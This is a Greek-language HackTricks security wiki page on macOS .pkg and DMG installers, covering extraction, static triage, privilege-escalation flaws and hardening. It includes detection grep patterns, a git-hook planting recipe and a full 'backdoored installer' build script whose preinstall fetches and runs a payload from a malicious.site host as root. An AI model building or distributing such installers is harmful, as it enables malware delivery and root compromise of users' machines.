# Κατάχρηση macOS Installers

{{#include ../../../banners/hacktricks-training.md}}

## Βασικές πληροφορίες για τα Pkg

Ένα **installer package** του macOS (γνωστό και ως αρχείο `.pkg`) είναι μια μορφή αρχείου που χρησιμοποιείται από το macOS για τη **διανομή software**. Αυτά τα αρχεία είναι σαν ένα **κουτί που περιέχει όλα όσα χρειάζεται ένα κομμάτι software** για να εγκατασταθεί και να εκτελεστεί σωστά.

Το ίδιο το αρχείο package είναι ένα archive που περιέχει μια **ιεραρχία αρχείων και directories που θα εγκατασταθούν στον υπολογιστή-στόχο**. Μπορεί επίσης να περιλαμβάνει **scripts** για την εκτέλεση εργασιών πριν και μετά την εγκατάσταση, όπως τη ρύθμιση configuration files ή τον καθαρισμό παλαιότερων εκδόσεων του software.

### Δομή Package

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Προσαρμογές (τίτλος, κείμενο υποδοχής…) και έλεγχοι script/installation
- **PackageInfo (xml)**: Πληροφορίες, απαιτήσεις εγκατάστασης, τοποθεσία εγκατάστασης, paths προς scripts που θα εκτελεστούν
- **Bill of materials (bom)**: Λίστα αρχείων προς εγκατάσταση, ενημέρωση ή αφαίρεση, μαζί με τα file permissions
- **Payload (CPIO archive gzip compressed)**: Αρχεία προς εγκατάσταση στο `install-location` από το PackageInfo
- **Scripts (CPIO archive gzip compressed)**: Pre και post install scripts και περισσότεροι πόροι που εξάγονται σε ένα temp directory για εκτέλεση.

### Αποσυμπίεση
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Για να οπτικοποιήσετε τα περιεχόμενα του installer χωρίς να το αποσυμπιέσετε χειροκίνητα, μπορείτε επίσης να χρησιμοποιήσετε το δωρεάν εργαλείο [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).

### Συντομεύσεις για static triage

Αν ο στόχος είναι η ανάλυση, προσπαθήστε να **αποφύγετε το άνοιγμα του package με το `Installer.app` πρώτα**. Ορισμένα packages μπορούν να εκτελέσουν κώδικα μόλις τα ανοίξει το Installer (για παράδειγμα μέσω `system.run()` ή installer plug-ins), επομένως η offline extraction είναι συνήθως το ασφαλέστερο σημείο εκκίνησης.
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## Βασικές πληροφορίες DMG

Τα αρχεία DMG, ή Apple Disk Images, είναι μια μορφή αρχείων που χρησιμοποιείται από το macOS της Apple για disk images. Ένα αρχείο DMG είναι ουσιαστικά ένα **mountable disk image** (περιέχει το δικό του filesystem) που περιέχει raw block data, συνήθως συμπιεσμένα και μερικές φορές κρυπτογραφημένα. Όταν ανοίγετε ένα αρχείο DMG, το macOS το **κάνει mount σαν να ήταν φυσικός δίσκος**, επιτρέποντάς σας να αποκτήσετε πρόσβαση στα περιεχόμενά του.

> [!CAUTION]
> Σημειώστε ότι οι installers **`.dmg`** υποστηρίζουν **τόσες πολλές μορφές**, ώστε στο παρελθόν ορισμένοι από αυτούς που περιείχαν vulnerabilities να έχουν γίνει αντικείμενο abuse για την απόκτηση **kernel code execution**.

### Δομή Disk Image

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

Η ιεραρχία ενός αρχείου DMG μπορεί να διαφέρει ανάλογα με το περιεχόμενο. Ωστόσο, για application DMGs, συνήθως ακολουθεί την εξής δομή:

- Top Level: Αυτό είναι το root του disk image. Συχνά περιέχει την εφαρμογή και πιθανώς ένα link προς τον φάκελο Applications.
- Application (.app): Αυτή είναι η πραγματική εφαρμογή. Στο macOS, μια εφαρμογή είναι συνήθως ένα package που περιέχει πολλά μεμονωμένα αρχεία και φακέλους που αποτελούν την εφαρμογή.
- Applications Link: Αυτό είναι ένα shortcut προς τον φάκελο Applications στο macOS. Σκοπός του είναι να διευκολύνει την εγκατάσταση της εφαρμογής. Μπορείτε να σύρετε το αρχείο .app σε αυτό το shortcut για να εγκαταστήσετε την εφαρμογή.

## Privesc μέσω pkg abuse

### Εκτέλεση από public directories

Αν ένα pre- ή post-installation script εκτελεί ένα αρχείο όπως το **`/var/tmp/Installerutil`** και ένας attacker μπορεί να αντικαταστήσει αυτό το αρχείο, μπορεί να κάνει escalate privileges όταν ο installer το καλέσει. Τα cited talks και walkthrough παρουσιάζουν παραλλαγές αυτού του insecure external-script pattern.<sup>[[1]](#references)</sup><sup>[[3]](#references)</sup><sup>[[4]](#references)</sup>

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Αυτή είναι μια [public function](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg) που αρκετοί installers και updaters καλούν για να **εκτελέσουν κάτι ως root**. Αυτή η function δέχεται ως παράμετρο το **path** του **file** που θα **εκτελεστεί**. Ωστόσο, αν ένας attacker μπορούσε να **τροποποιήσει** αυτό το file, θα μπορούσε να κάνει **abuse** της εκτέλεσής του με root για να **κάνει escalate privileges**.
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
Για περισσότερες πληροφορίες, δείτε αυτή την ομιλία: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)<sup>[[8]](#references)</sup>

### Κατάχρηση environment και shebang

Σφάλματα του σύγχρονου PackageKit έδειξαν ότι τα scripts εγκατάστασης εκτελούνται συχνά ως **κώδικας root με δικαιώματα trust**, ενώ παράλληλα διατηρούν κοντά τους context που ελέγχεται από τον attacker. Κατά τον έλεγχο πακέτων προμηθευτών, δώστε ιδιαίτερη προσοχή στα εξής:

- Shell interpreters όπως `#!/bin/zsh` / `#!/bin/bash`
- Κλήσεις όπως `sudo -u $USER`, `launchctl asuser` ή οποιαδήποτε λογική που εμπιστεύεται τα `$USER`, `$HOME`, `PATH`, `TMPDIR` ή relative paths
- Interpreters που δεν είναι shell και ενδέχεται να φορτώνουν init files ή libraries που ελέγχονται από τον user
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
Για το bug του PackageKit του 2024 στο root-environment (`~/.zshenv` / `~/.bash*` inheritance κατά την εγκατάσταση που ξεκινά από user), ελέγξτε τη [γενική σελίδα macOS privesc](../macos-privilege-escalation.md). Αν το package είναι **Apple-signed**, το ίδιο script bug μπορεί να γίνει **SIP/TCC-relevant**, επειδή το `system_installd` μπορεί να φέρει το `com.apple.rootless.install.heritable`. Δείτε τη [σελίδα SIP](../macos-security-protections/macos-sip.md).<sup>[[5]](#references)</sup><sup>[[6]](#references)</sup>

### Stateful inputs και implicit callbacks

Μην περιορίζετε τον έλεγχο σε προφανές command injection. Ένα root `preinstall`/`postinstall` μπορεί να διασχίσει ένα trust boundary κάθε φορά που καταναλώνει **state που υπήρχε πριν από την εγκατάσταση**: προβλέψιμα αρχεία στο `/tmp` ή στο `/var/tmp`, ένα υπάρχον installation tree με δυνατότητα εγγραφής από τον user, configuration files, repository metadata ή ένα username που στη συνέχεια περνά στο `chown`.<sup>[[9]](#references)[[10]](#references)</sup>

Δύο πρόσφατα Homebrew installer flaws παρουσιάζουν επαναχρησιμοποιήσιμες παραλλαγές:

- **Attacker-selected ownership:** ένα package-user override διαβαζόταν από το προβλέψιμο `/var/tmp/.homebrew_pkg_user.plist` χωρίς validation του owner, του mode, των ACLs, του symlink state ή του provenance. Ένας low-privileged user μπορούσε να επιλέξει τον δικό του account και ένα μεταγενέστερο root `postinstall` μετέφερε αναδρομικά την ownership του Homebrew tree και του cache σε αυτόν. Αυτό ήταν privilege-assignment flaw και όχι shell injection.<sup>[[9]](#references)</sup>
- **Tool callbacks from an existing tree:** ένα root `postinstall` εκτελούσε `git checkout` μέσα σε μια εγκατάσταση που ήταν σκόπιμα writable από τον κανονικό user της. Η τοποθέτηση ενός executable `.git/hooks/post-checkout` μετέτρεπε επομένως μια μεταγενέστερη GUI/MDM package upgrade σε root code execution. Στο Intel path, το merging του packaged `.git` directory στο υπάρχον repository διατηρούσε επίσης τα hooks που είχε προσθέσει ο attacker.<sup>[[10]](#references)</sup>

Το δεύτερο primitive είναι εύκολο να μοντελοποιηθεί κατά τη διάρκεια ενός authorized test· το trigger ενεργοποιείται μόνο όταν ο ευάλωτος privileged installer εκτελέσει αργότερα μια Git operation που υποστηρίζει hooks.<sup>[[10]](#references)</sup>
```bash
repo=/path/to/user-writable/install
mkdir -p "$repo/.git/hooks"
cat > "$repo/.git/hooks/post-checkout" <<'EOF'
#!/bin/sh
id > /tmp/pkg-post-checkout-context
EOF
chmod +x "$repo/.git/hooks/post-checkout"
# Wait for the privileged .pkg install/upgrade; do not invoke it as root just to test.
```
Επεκτείνετε τα ένθετα packages και αντιστοιχίστε κάθε πηγή που ελέγχεται από τον attacker σε ένα privileged sink. Εκτός από την άμεση εκτέλεση, αναζητήστε parsers, αλλαγές ownership και tools με μηχανισμούς plug-in/hook.<sup>[[9]](#references)[[10]](#references)</sup>
```bash
PKG=Target.pkg
OUT=$(mktemp -d)
pkgutil --expand-full "$PKG" "$OUT"
grep -RniE '(/var/tmp|/tmp|defaults[[:space:]]+read|PlistBuddy|chown[[:space:]]+-R)' "$OUT"
grep -RniE '(^|[;&|[:space:]])(git|svn|hg|npm|pip|ruby|python)[[:space:]]' "$OUT"
grep -RniE '(checkout|reset|submodule|hooksPath|GIT_(DIR|CONFIG)|PYTHONPATH|RUBYOPT)' "$OUT"
```
Για hardening, μετακινήστε τα privileged inputs σε έναν root-owned staging directory και επικυρώστε κάθε path αμέσως πριν από τη χρήση του (regular file, αναμενόμενος owner/mode, χωρίς unsafe ACL και χωρίς symlink traversal). Αποφύγετε την αναδρομική αλλαγή ownership από untrusted identity. Όταν το Git πρέπει να εκτελεστεί πάνω σε ένα pre-existing tree, καταστείλετε ρητά τα callbacks (για παράδειγμα, `git -c core.hooksPath=/dev/null ...`) ή αντικαταστήστε ατομικά τα repository metadata πριν επικαλεστείτε το Git.<sup>[[9]](#references)[[10]](#references)</sup>

### Εκτέλεση μέσω mounting

Αν ένας installer γράφει στο `/tmp/fixedname/bla/bla`, είναι δυνατό να **δημιουργήσετε ένα mount** πάνω από το `/tmp/fixedname` με noowners, ώστε να μπορείτε να **τροποποιήσετε οποιοδήποτε αρχείο κατά την εγκατάσταση** και να κάνετε abuse στη διαδικασία εγκατάστασης.

Ένα παράδειγμα είναι το **CVE-2021-26089**, το οποίο κατάφερε να **αντικαταστήσει ένα periodic script** για να αποκτήσει execution ως root. Για περισσότερες πληροφορίες, δείτε την ομιλία: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)<sup>[[7]](#references)</sup>

## pkg ως malware

### Κενό Payload

Είναι δυνατό να δημιουργήσετε απλώς ένα **`.pkg`** αρχείο με **pre και post-install scripts**, χωρίς πραγματικό payload πέρα από το malware που βρίσκεται μέσα στα scripts.<sup>[[2]](#references)</sup>

### JS σε Distribution xml

Είναι δυνατό να προσθέσετε tags **`<script>`** στο αρχείο **distribution xml** του package, και ο κώδικας αυτός θα εκτελεστεί. Μπορεί να **εκτελέσει commands** χρησιμοποιώντας το **`system.run`**:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

Στα distribution packages, αυτό συνήθως εξαρτάται από το top-level αρχείο `Distribution`, το οποίο ενεργοποιεί external scripts, για παράδειγμα με `allow-external-scripts="true"`. Επομένως, ο έλεγχος μόνο των `preinstall` / `postinstall` δεν αρκεί: το ίδιο το **Distribution XML** μπορεί να περιέχει hooks `installation-check` / `volume-check` και direct paths εκτέλεσης μέσω `system.run()` / `system.runOnce()`.
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### Installer με Backdoor

Κακόβουλος installer που χρησιμοποιεί ένα script και κώδικα JS μέσα στο dist.xml
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## References

- [1] [DEF CON 27 - Αποσυσκευασία PKG: Μια ματιά στο εσωτερικό των πακέτων εγκατάστασης macOS και στις συνήθεις αδυναμίες ασφαλείας](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [2] [OBTS v4.0: «Ο άγριος κόσμος των Installers του macOS» - Tony Lambert](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [3] [DEF CON 27 - Αποσυσκευασία PKG: Μια ματιά στο εσωτερικό των πακέτων εγκατάστασης macOS](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [4] [RedTeamRecipe – Red Teaming στο macOS: Εκμετάλλευση πακέτων εγκατάστασης](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [5] [CVE-2024-27822: Κλιμάκωση προνομίων μέσω του PackageKit στο macOS](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [6] [Παράκαμψη του SIP με πακέτα υπογεγραμμένα από την Apple](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)
- [7] [OBTS v4.0: «Βουνό από bugs» - Csaba Fitzl](https://www.youtube.com/watch?v=jSYPazD4VcE)
- [8] [DEF CON 25 - Patrick Wardle - Θάνατος από 1.000 Installers στο macOS και όλα είναι broken!](https://www.youtube.com/watch?v=lTOItyjTTkw)
- [9] [Ο installer του Homebrew για macOS εμπιστεύεται ένα plist package-user που ελέγχεται από τον χρήστη](https://github.com/Homebrew/brew/security/advisories/GHSA-59v8-x8q4-px5c)
- [10] [Εκτέλεση κώδικα ως root μέσω Git hooks σε postinstall macOS PKG](https://github.com/Homebrew/brew/security/advisories/GHSA-6689-q779-c33m)
{{#include ../../../banners/hacktricks-training.md}}
